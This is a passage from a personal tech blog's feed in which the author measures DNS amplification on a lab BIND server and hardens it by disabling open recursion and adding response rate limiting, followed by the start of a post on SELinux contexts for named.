$ 14:40:59.362728 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [F.], seq 28, ack 3315, win 182, options [nop,nop,TS val 83179162 ecr 82842605], length 0
$ 14:40:59.362875 IP master.test.cn.domain &gt; attack.test.cn.39772: Flags [F.], seq 3315, ack 29, win 114, options [nop,nop,TS val 82842608 ecr 83179162], length 0
$ 14:40:59.363453 IP attack.test.cn.39772 &gt; master.test.cn.domain: Flags [.], ack 3316, win 182, options [nop,nop,TS val 83179163 ecr 82842608], length 0
</code></p>

<p>That's a 64 byte query that resulted in a 3,620 byte response.
And there are UDP and TCP.</p>

<p>You can find this test from <a href="http://blog.cloudflare.com/deep-inside-a-dns-amplification-ddos-attack">Deep Inside a DNS Amplification DDoS Attack</a>.</p>

<h1>My test nameserver is going to make a change</h1>

<h2>Backup my former configure files</h2>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>backup_configure_files - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;master_192.168.10.112  etc]$ cp -P named.conf named.conf.20130509</span>
</span><span class='line'><span class="sr"> [root@_slave_192.168.10.111  etc]$ cp -P named.conf named.conf.20130509</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h2>Change the configuration files</h2>

<h3>Recursiver</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>named.conf - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="no">Options</span> <span class="p">{</span>
</span><span class='line'> <span class="sr">/&lt;em&gt; ... &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr"> /</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span>  <span class="n">allow</span><span class="o">-</span><span class="n">query</span> <span class="p">{</span> <span class="n">any</span><span class="p">;</span> <span class="p">};</span> <span class="o">&lt;</span><span class="sr">/em&gt;/</span>
</span><span class='line'> <span class="sr">/&lt;em&gt;  allow-recursion { any; }; &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr">   recursion no;</span>
</span><span class='line'><span class="sr">   additional-from-cache no;</span>
</span><span class='line'><span class="sr">   allow-query { none; };</span>
</span><span class='line'><span class="sr"> /</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span> <span class="o">&lt;</span><span class="sr">/em&gt;/</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'> <span class="sr">/&lt;em&gt; ... &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr"> view &quot;lan192&quot; {</span>
</span><span class='line'><span class="sr">   match-clients { key lan192;zone1; };</span>
</span><span class='line'><span class="sr">   allow-query { zone1; };</span>
</span><span class='line'><span class="sr">   recursion yes;</span>
</span><span class='line'><span class="sr">   additional-from-cache yes;</span>
</span><span class='line'><span class="sr"> /</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span> <span class="o">&lt;</span><span class="sr">/em&gt;/</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'> <span class="n">view</span> <span class="s2">&quot;lan10&quot;</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">match</span><span class="o">-</span><span class="n">clients</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan10</span><span class="p">;</span><span class="n">zone2</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">allow</span><span class="o">-</span><span class="n">query</span> <span class="p">{</span> <span class="n">zone2</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">recursion</span> <span class="n">yes</span><span class="p">;</span>
</span><span class='line'>   <span class="n">additional</span><span class="o">-</span><span class="n">from</span><span class="o">-</span><span class="n">cache</span> <span class="n">yes</span><span class="p">;</span>
</span><span class='line'> <span class="sr">/&lt;em&gt; ... &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr"> }</span>
</span><span class='line'><span class="sr"> /</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span> <span class="o">&lt;</span><span class="sr">/em&gt;/</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Check named.conf file and restart the server.</h4>

<h4>Slave also</h4>

<p>.Did it.</p>

<h3>DNS Response Rate Limiting</h3>

<p>http://www.redbarn.org/dns/ratelimits <a href="http://www.redbarn.org/dns/ratelimits">link1</a><br />
http://ss.vix.su/~vjs/rrlrpz.html <a href="http://ss.vix.su/~vjs/rrlrpz.html">link2</a><br /></p>

<h4>master_192.168.10.112_named.conf</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>named.conf - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="sr">/&lt;em&gt; ... &lt;/em</span><span class="o">&gt;</span><span class="sr">/</span>
</span><span class='line'><span class="sr"> options {</span>
</span><span class='line'><span class="sr"> /</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span> <span class="o">&lt;</span><span class="sr">/em&gt;/</span>
</span><span class='line'>  <span class="n">rate</span><span class="o">-</span><span class="n">limit</span> <span class="p">{</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;pre&gt;&lt;code&gt; responses-per-second 5;</span>
</span><span class='line'><span class="sr"> window 5;</span>
</span><span class='line'><span class="sr">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;</span><span class="sr">/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;  };</span>
</span><span class='line'><span class="sr"> };</span>
</span><span class='line'><span class="sr"> /</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span> <span class="o">&lt;</span><span class="sr">/em&gt;/</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>slave no changes.</h4>

<h4>Restart the M/S servers.</h4>

<h4>TEST</h4>

<h5>Test Scripts.</h5>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>dig112.sh </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="k">while</span> :
</span><span class='line'><span class="k">do</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;dig @192.168.10.112 +short +tries<span class="o">=</span>1 +time<span class="o">=</span>1 bbs.test.cn a
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;done
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>dig111.sh </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="k">while</span> :
</span><span class='line'><span class="k">do</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;dig @192.168.10.111 +short +tries<span class="o">=</span>1 +time<span class="o">=</span>1 bbs.test.cn a
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;done
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h5>Do it.</h5>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>I did it - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="err">$</span> <span class="o">[</span><span class="n">root</span><span class="vi">@attack</span> <span class="nb">test</span><span class="o">]</span><span class="c1"># source dig111.sh</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>                <span class="o">//.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span><span class='line'><span class="err">$</span> <span class="o">^</span><span class="n">C</span>
</span><span class='line'><span class="err">$</span> <span class="o">[</span><span class="n">root</span><span class="vi">@attack</span> <span class="nb">test</span><span class="o">]</span><span class="c1">#</span>
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="err">$</span> <span class="o">[</span><span class="n">root</span><span class="vi">@attack</span> <span class="nb">test</span><span class="o">]</span><span class="c1"># source dig112.sh     //Ctrl+c can&#39;t stop the process. Except close the shell.</span>
</span><span class='line'><span class="err">$</span> <span class="o">[</span><span class="n">root</span><span class="vi">@attack</span> <span class="nb">test</span><span class="o">]</span><span class="c1"># source dig112.sh &gt;&gt; results.txt   //Then close the shell window.</span>
</span><span class='line'><span class="err">$</span> <span class="o">[</span><span class="n">root</span><span class="vi">@attack</span> <span class="nb">test</span><span class="o">]</span><span class="c1"># cat results.txt</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="n">connection</span> <span class="n">timed</span> <span class="n">out</span><span class="p">;</span> <span class="n">no</span> <span class="n">servers</span> <span class="n">could</span> <span class="n">be</span> <span class="n">reached</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="n">connection</span> <span class="n">timed</span> <span class="n">out</span><span class="p">;</span> <span class="n">no</span> <span class="n">servers</span> <span class="n">could</span> <span class="n">be</span> <span class="n">reached</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="n">connection</span> <span class="n">timed</span> <span class="n">out</span><span class="p">;</span> <span class="n">no</span> <span class="n">servers</span> <span class="n">could</span> <span class="n">be</span> <span class="n">reached</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="n">connection</span> <span class="n">timed</span> <span class="n">out</span><span class="p">;</span> <span class="n">no</span> <span class="n">servers</span> <span class="n">could</span> <span class="n">be</span> <span class="n">reached</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="n">connection</span> <span class="n">timed</span> <span class="n">out</span><span class="p">;</span> <span class="n">no</span> <span class="n">servers</span> <span class="n">could</span> <span class="n">be</span> <span class="n">reached</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>
</span><span class='line'><span class="err">$</span> <span class="p">;;</span> <span class="no">Truncated</span><span class="p">,</span> <span class="n">retrying</span> <span class="k">in</span> <span class="no">TCP</span> <span class="n">mode</span><span class="o">.</span>
</span><span class='line'><span class="err">$</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>It's so nice...</h4>

<h3>References</h3>

<ol>
<li><a href="http://openresolverproject.org/">Open DNS Resolver Project</a><br /></li>
<li><a href="http://dns.measurement-factory.com/cgi-bin/openresolverquery.pl">The Measurement Factory List Open Resolvers on Your Network</a><br /></li>
<li><a href="http://dns.measurement-factory.com/cgi-bin/openresolvercheck.pl">The Measurement Factory Open Resolver Test</a><br /></li>
<li><a href="http://dns.measurement-factory.com/surveys/openresolvers/ASN-reports/latest.html">The Measurement Factory Open Resolvers for Each Autonomous System</a><br /></li>
<li><a href="http://www.dnsinspect.com/">DNSInspect com</a><br /></li>
<li><a href="http://tools.ietf.org/html/rfc1034">RFC 1034 DOMAIN NAMES  CONCEPTS AND FACILITIES</a><br /></li>
<li><a href="http://tools.ietf.org/html/bcp38">BCP 38 Network Ingress Filtering Defeating Denial of Service Attacks which employ IP Source Address Spoofing</a><br /></li>
<li><a href="http://ftp.isc.org/isc/bind9/cur/9.9/doc/arm/Bv9ARM.ch03.html#id2567992">Chapter 3 Name Server Configuration</a><br /></li>
<li><a href="http://technet.microsoft.com/en-us/library/cc787602.aspx">Disable recursion on the DNS server</a><br /></li>
<li><a href="http://ftp.isc.org/isc/bind9/cur/9.9/doc/arm/Bv9ARM.ch07.html#Access_Control_Lists">Chapter 7 BIND 9 Security Considerations</a><br /></li>
<li><a href="http://technet.microsoft.com/en-us/library/cc754941.aspx">Configure a DNS Server to Use Forwarders</a><br /></li>
<li><a href="http://ss.vix.su/~vixie/isc-tn-2012-1.txt">DNS Response Rate Limiting DNS RRL</a><br /></li>
<li><a href="http://www.redbarn.org/dns/ratelimits">Response Rate Limiting in the Domain Name System DNS RRL</a><br /></li>
</ol>


<h2>God bless my servers...</h2>

<h3>more......</h3>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DNS and SELinux]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/08/dns-and-selinux/"/>
    <updated>2013-05-08T16:10:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/08/dns-and-selinux</id>
    <content type="html"><![CDATA[<p><img src="/images/selinux.jpg" alt="alt text" /><br />
<a href="http://wiki.centos.org/HowTos/SELinux">CentOS Wiki about SELinux</a><br /></p>

<!-- more -->


<h2>My Test Environment</h2>

<p><img src="/images/selinux_and_dns.jpg" alt="alt text" /><br />
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">srvmpio</span>
</span><span class='line'> <span class="no">Linux</span> <span class="mi">2</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">32</span><span class="o">-</span><span class="mi">279</span><span class="o">.</span><span class="mi">14</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">el6</span><span class="o">.</span><span class="n">x86_64</span> <span class="c1">#1 SMP Tue Nov 6 23:43:09 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;master_192.168.10.112  etc]$ cat /e</span><span class="n">tc</span><span class="o">/</span><span class="n">issue</span>
</span><span class='line'> <span class="no">CentOS</span> <span class="n">release</span> <span class="mi">6</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Final</span><span class="p">)</span>
</span><span class='line'> <span class="no">Kernel</span> <span class="p">\</span><span class="n">r</span> <span class="n">on</span> <span class="n">an</span> <span class="p">\</span><span class="n">m</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">getenforce</span>      <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'> <span class="no">Enforcing</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;master_192.168.10.112  etc]$ named -version</span>
</span><span class='line'><span class="sr"> BIND 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6_4.4</span>
</span><span class='line'><span class="sr"> [root@_master_192.168.10.112  etc]$ dig txt chaos version.bind.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><strong><em>Slave 192.168.10.111 is the same configuration.</em></strong>
The test is based on <a href="http://lin-credible.github.io/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig/?=241520525">my previous done</a></p>

<h2>named_selinux</h2>

<p><code>
man 8 named_selinux
</code></p>

<h3>File context</h3>

<h4>named_conf_t</h4>

<p>```
Set files with the named_conf_t type, if you want to treat the files as named configuration data,
usually stored under the /etc directory.</p>

<p>Paths:</p>

<pre><code>/var/named/chroot/etc/named.root.hints,     /var/named/chroot(/.*)?,      /var/named/named.ca,
/etc/unbound(/.*)?,                       /var/named/chroot/etc/named.caching-nameserver.conf,
/etc/named.root.hints,  /var/named/chroot/etc/named.rfc1912.zones,   /etc/named.rfc1912.zones,
/etc/named.caching-nameserver.conf,   /etc/named.conf,   /var/named/chroot/var/named/named.ca,
/var/named/chroot/etc/named.conf, /etc/rndc.*
</code></pre>

<p>```</p>

<h4>named_zone_t</h4>

<p>```
Set files with the named_zone_t type, if you want to treat the files as named zone data.</p>

<p>Paths:</p>

<pre><code>/var/named/chroot/var/named(/.*)?, /var/named(/.*)?
</code></pre>

<p>```
......</p>

<h3>master</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
